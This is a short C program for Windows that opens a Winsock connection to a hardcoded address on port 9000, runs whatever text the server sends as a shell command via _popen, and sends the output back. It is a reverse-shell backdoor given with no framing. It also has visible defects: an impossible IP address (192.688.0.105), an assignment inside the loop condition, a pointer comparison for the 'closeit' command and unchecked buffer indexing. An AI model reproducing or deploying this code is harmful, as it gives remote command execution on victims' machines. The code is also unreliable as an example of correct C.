#include<stdio.h>
#include<winsock2.h>
#include <conio.h>
#pragma comment(lib,"ws2_32.lib") //Winsock Library
SOCKET s;
WSADATA wsa;
struct sockaddr_in server;
void srvr_connect()
{
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("connect error");
		srvr_connect(); 
    }
}
int main(int argc , char *argv[])
{ 
	int loop = 1;
    char server_reply[2000];
    int recv_size;
	char   psBuffer[128];
    FILE   *pPipe;
	char *host = "192.688.0.105";
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
     
    //Create a socket
    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
     
     
    server.sin_addr.s_addr = inet_addr(host);
    server.sin_family = AF_INET;
    server.sin_port = htons( 9000 );
 
    //Connect to remote server
	srvr_connect();  
    //Receive a reply from the server
	while (loop = 1)
	{
		if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
		{
			puts("recv failed");
		}
     
		puts("Reply received\n");
 
		//Add a NULL terminating character to make it a proper string before printing
		server_reply[recv_size] = '\0';
		puts(server_reply);
		if (server_reply == "closeit")
		{
			loop = 0;
		}
		if( (pPipe = _popen( server_reply, "rt" )) != NULL)
		{
			while(fgets(psBuffer, 128, pPipe))
			{
				printf(psBuffer);
				if( send(s , psBuffer, strlen(psBuffer) , 0) < 0)
				{
					puts("Send failed");
					return 1;
				}
			}
		}
		//Send some data
		puts("Data Send\n");
	}
	getch();
    return 0;
}
